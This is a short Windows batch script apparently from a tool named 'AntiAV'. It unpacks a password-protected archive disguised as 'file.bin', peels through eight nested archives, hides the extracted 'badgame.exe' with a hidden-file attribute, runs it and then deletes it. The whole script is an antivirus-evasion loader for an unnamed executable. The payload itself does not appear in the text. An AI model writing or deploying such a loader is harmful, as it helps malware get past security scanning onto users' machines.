��&cls
@echo off
mode 65,10
title AntiAV (https://github.com/hXR16F/AntiAV)
md extracted
ren file.bin file.zip
call 7z.exe e file.zip -p___________12228pwd28123pwd22111___________ -oextracted 
for /l %%i in (8,-1,1) do (
call 7z.exe e extracted/file_%%i.zip -oextracted
)
ren file.zip file.bin
cd extracted
move "badgame.exe" ../
cd..
rd /s /q extracted
attrib +H "badgame.exe"
start "" "badgame.exe"
cls
echo Launched 'badgame.exe'.
pause
del /f /q "badgame.exe"
